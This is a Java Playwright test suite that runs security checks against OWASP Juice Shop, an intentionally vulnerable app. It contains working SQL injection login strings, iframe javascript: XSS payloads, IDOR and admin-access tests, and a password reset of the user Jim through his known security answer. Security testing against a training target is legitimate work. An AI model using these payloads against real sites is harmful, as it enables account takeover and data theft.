package tests;

import base.BaseTest;
import com.microsoft.playwright.Locator;
import config.TestConfig;
import io.qameta.allure.*;
import org.junit.jupiter.api.*;
import pages.LoginPage;
import pages.SecurityPage;
import pages.XssPage;
import utils.ScreenshotsSelective;

import static io.qameta.allure.SeverityLevel.CRITICAL;
//import io.qameta.allure.playwright.AllurePlaywright;

/**
 * Page Object страницы входа в личный кабинет.
 * Работает с LoginPage и InventoryPage,
 * что упрощает поддержку тестов при изменении UI.
 */
@TestMethodOrder(MethodOrderer.OrderAnnotation.class)
@Epic("JuiceShopped UI Tests")
@Feature("Security Tests")
@DisplayName("Тесты инъекций и XSS")
@Owner("Ilya Testinov")
@Order(6)
public class SecurityTest extends BaseTest {
    private LoginPage loginPage;

    @BeforeEach
    void openLogin() {
        openBaseUrl();
        loginPage = new LoginPage(page);
    }

    @Test
    @Order(1)
    @DisplayName("SEC-01: Войти в личный кабинет Admin с помощь SQL-инъекции(CWE-89)")
    @Severity(SeverityLevel.CRITICAL)
    void wrongUserLogin() {
        loginPage
                .loginAs("admin@juice-sh.op' OR '1'='1'--", TestConfig.getInvalidPassword3())
                .assertLoggedIn()                ;

        ScreenshotsSelective.capture(null, page);
        // В конце успешного теста (например, после проверки XSS)
        //AllurePlaywright.attachScreenshot("После проверки XSS", page);
    }
    @Test
    @Order(2)
    @DisplayName("SEC-02: Reflected XSS в поиске (CWE-79)")
    @Severity(SeverityLevel.CRITICAL)
    void reflectedXssInSearch() {
        loginPage
                .clickDismiss();

        XssPage xssPage = new XssPage(page);
        xssPage

                .attemptSearchXss("<iframe src=\"javascript:alert('Reflected XSS')\">")
                .assertXssTriggered();
        page.waitForTimeout(2000);
        ScreenshotsSelective.capture(null, page);
    }
    @Test
    @Order(3)
    @DisplayName("SEC-03: DOM XSS через параметр URL (CWE-79)")
    @Severity(SeverityLevel.NORMAL)
    void domXssInSearch() {
        XssPage xssPage = new XssPage(page);
        // Payload из официального решения
        xssPage
                .attemptDomXss("<iframe src=\"javascript:alert(`DOM XSS`)\">")
                .assertXssTriggered();
        page.waitForTimeout(2000);
        ScreenshotsSelective.capture(null, page);
    }
    @Test
    @Order(4)
    @DisplayName("SEC-04: IDOR в API корзины — доступ к чужой корзине (CWE-639)")
    @Severity(SeverityLevel.NORMAL)
    void idorInBasket() {
        // 1. Логинимся как обычный пользователь
        loginPage.loginAs(TestConfig.getStandardUser(), TestConfig.getPassword());

        // 2. Создаём SecurityPage
        SecurityPage securityPage = new SecurityPage(page);

        // 3. Узнаём свой basketId
        int myBasketId = securityPage.getMyBasketId();
        System.out.println(">>> Мой basketId: " + myBasketId);

        // 4. Выбираем чужой basketId (корзина админа = 1)
        int targetBasketId = 1;
        if (myBasketId == targetBasketId) {
            targetBasketId = 2;  // если ты и есть админ — берём другую
        }

        // 5. Выполняем IDOR-запрос с прикреплением доказательства в Allure
        securityPage.attemptIdorOnBasketWithEvidence(targetBasketId);
    }

    @Test
    @Order(5)
    @DisplayName("SEC-05: Доступ к админ-панели без прав администратора (CWE-285)")
    @Severity(SeverityLevel.CRITICAL)
    void adminSectionAccess() {
        // Логинимся как обычный пользователь (не админ)
        loginPage.loginAs(TestConfig.getStandardUser(), TestConfig.getPassword());

        SecurityPage securityPage = new SecurityPage(page);
        securityPage
                .attemptAdminSectionAccess()
                .assertUsersTableNotEmpty();
        ScreenshotsSelective.capture(null, page);
    }
    @Test
    @Order(6)
    @DisplayName("SEC-06: Цепочка SQLi → доступ к админ-панели (CWE-89 + CWE-285)")
    @Severity(SeverityLevel.CRITICAL)
    void adminSectionAfterSqli() {
        // 1. Захватываем админа через SQLi
        loginPage.loginAs("' OR '1'='1'--", "any_password");

        // 2. Переходим в админку
        page.navigate(TestConfig.getBaseUrl() + "/#/administration");
        page.waitForTimeout(2000);

        // 3. Проверяем, что видим таблицу с данными
        Locator table = page.locator("mat-table, table");
        if (table.count() == 0) {
            throw new AssertionError("Админ-панель не открылась после SQLi");
        }

        // 4. Дополнительно: проверяем, что в таблице есть строки
        int rows = page.locator("mat-table mat-row, table tr").count();
        System.out.println(">>> Цепочка SQLi → Admin подтверждена. Строк в таблице: " + rows);
        // 5. Проверить, что в админ-панели отображаются пользователи
        SecurityPage securityPage = new SecurityPage(page);
        securityPage
                .assertUsersTableNotEmpty();
        // 6. Проверить, что в таблице есть admin@juice-sh.op
        securityPage
                .assertAdminUserPresent();
        ScreenshotsSelective.capture(null, page);
    }
    @Test
    @Order(7)
    @DisplayName("SEC-07: Stored XSS в отзывах (CWE-79)")
    @Severity(SeverityLevel.MINOR)
    void storedXssInReview() {
        // Логинимся (отзывы требуют авторизации)
        loginPage.loginAs(TestConfig.getStandardUser(), TestConfig.getPassword());

        XssPage xssPage = new XssPage(page);
        xssPage
                .leaveReviewWithPayload("<iframe src=\"javascript:alert(`stored`)\">")
                .assertXssBlocked();
        ScreenshotsSelective.capture(null, page);
    }
    @Test
    @Order(8)
    @DisplayName("SEC-08: API-only XSS через изменение описания товара (CWE-79)")
    @Severity(SeverityLevel.CRITICAL)
    void apiOnlyXss() {
        // 1. Захватываем админа через SQLi (нужны права на PUT /api/products)
        loginPage.loginAs("' OR '1'='1'--", "any_password");

        // 2. Выполняем API-only XSS
        SecurityPage securityPage = new SecurityPage(page);
        securityPage
                .attemptApiXss(1, "<iframe src=\"javascript:alert(`xss`)\">")
                .assertApiXssTriggered(1);
        page.waitForTimeout(2000);
        ScreenshotsSelective.capture(null, page);
    }
    @Test
    @Order(9)
    @DisplayName("SEC-09: Сброс пароля Jim через security question (CWE-640)")
    @Severity(SeverityLevel.MINOR)
    void resetJimPassword() {
        loginPage
                .clickDismiss();
        SecurityPage securityPage = new SecurityPage(page);

        // 1. Сбрасываем пароль Jim через секретный вопрос ("Samuel")
        securityPage.resetPasswordViaSecurityQuestion(
                "jim@juice-sh.op",
                "Samuel",
                "NewPassword123!"
        );

        // 2. Пробуем войти под Jim с новым паролем
        loginPage.loginAs1("jim@juice-sh.op", "NewPassword123!");
        page.waitForTimeout(1000);

        // 3. Проверяем, что вход выполнен (токен в localStorage)
        String token = (String) page.evaluate("() => localStorage.getItem('token')");
        if (token == null || token.isEmpty()) {
            throw new AssertionError("Сброс пароля Jim не сработал — вход не выполнен");
        }
        System.out.println(">>> Аккаунт Jim захвачен! Пароль сброшен на NewPassword123!");
        page.locator("app-navbar button:has(mat-icon:text('shopping_cart'))").click();
        page.waitForTimeout(1000);
        ScreenshotsSelective.capture(null, page);
    }
    @Test
    @Order(10)
    @DisplayName("SEC-10: Подделка отзыва от имени другого пользователя (CWE-639)")
    @Severity(SeverityLevel.CRITICAL)
    void forgedReview() {
        // Логинимся как обычный пользователь
        loginPage.loginAs(TestConfig.getStandardUser(), TestConfig.getPassword());

        SecurityPage securityPage = new SecurityPage(page);
        securityPage.forgeReview("admin@juice-sh.op", "This is a forged review from admin!");

        // Дополнительно: можно проверить, что отзыв появился
        page.navigate(TestConfig.getBaseUrl() + "/#/search?q=apple");

        // ... проверка текста отзыва на странице ...
        page.locator("img.mat-card-image[alt='Apple Juice (1000ml)']").click();
        page.waitForTimeout(1000);
        page.locator("mat-expansion-panel-header:has-text('Reviews')").click();
        page.waitForTimeout(1000);
        ScreenshotsSelective.capture(null, page);
    }

    @Test
    @Order(11)
    @DisplayName("SEC-11: Unsigned JWT (alg:none) обходит аутентификацию (CWE-347)")
    @Severity(SeverityLevel.NORMAL)
    void unsignedJwt() {
        // Логинимся, чтобы страница была в «нормальном» состоянии
        loginPage.loginAs(TestConfig.getStandardUser(), TestConfig.getPassword());

        SecurityPage securityPage = new SecurityPage(page);
        securityPage.attemptUnsignedJwt();

    }
    @Test
    @Order(12)
    @DisplayName("SEC-12: Подмена описания товара обычным пользователем (CWE-639)")
    @Severity(SeverityLevel.NORMAL)
    void productTampering() {
        loginPage.loginAs(TestConfig.getStandardUser(), TestConfig.getPassword());

        SecurityPage securityPage = new SecurityPage(page);

        // 1. Получаем описание ДО
        String descBefore = securityPage.getProductDescription(9);
        io.qameta.allure.Allure.addAttachment(
                "ДО: description товара id=9",
                "text/plain",
                new java.io.ByteArrayInputStream(descBefore.getBytes()),
                "txt"
        );

        // 2. Подменяем
        String newDescription = "OWASP SSL Advanced Forensic Tool. <a href=\"https://owasp.slack.com\" target=\"_blank\">More...</a>";
        securityPage.tamperProductDescription(9, newDescription);

        // 3. Получаем описание ПОСЛЕ
        String descAfter = securityPage.getProductDescription(9);
        io.qameta.allure.Allure.addAttachment(
                "ПОСЛЕ: description товара id=9",
                "text/plain",
                new java.io.ByteArrayInputStream(descAfter.getBytes()),
                "txt"
        );

        // 4. Проверяем, что изменилось
        if (descBefore.equals(descAfter)) {
            throw new AssertionError("Описание не изменилось!");
        }
        System.out.println(">>> Подмена подтверждена: '" + descBefore + "' → '" + descAfter + "'");
    }
    @Test
    @Order(13)
    @DisplayName("SEC-13: SQLi извлечение схемы БД (CWE-89)")
    @Story("SQL Injection: Database Schema Extraction")
    @Severity(SeverityLevel.CRITICAL)
    void databaseSchemaExtraction() {
        SecurityPage securityPage = new SecurityPage(page);
        securityPage.extractDbSchema();
        page.waitForTimeout(1000);
        ScreenshotsSelective.capture(null, page);
    }
    @Test
    @Order(14)
    @DisplayName("SEC-14: SQLi — извлечение учётных данных пользователей (CWE-89)")
    @Story("SQL Injection: User Credentials Extraction")
    @Severity(SeverityLevel.CRITICAL)
    void userCredentialsExtraction() {
        SecurityPage securityPage = new SecurityPage(page);
        securityPage.extractUserCredentials();
    }
    @Test
    @Order(15)
    @DisplayName("SEC-15: SQLi — Ephemeral Accountant (вход под несуществующим бухгалтером, CWE-89)")
    @Story("SQL Injection: Ephemeral Accountant")
    @Severity(SeverityLevel.CRITICAL)
    void ephemeralAccountantLogin() {
        SecurityPage securityPage = new SecurityPage(page);
        securityPage.loginAsEphemeralAccountant();
    }
}







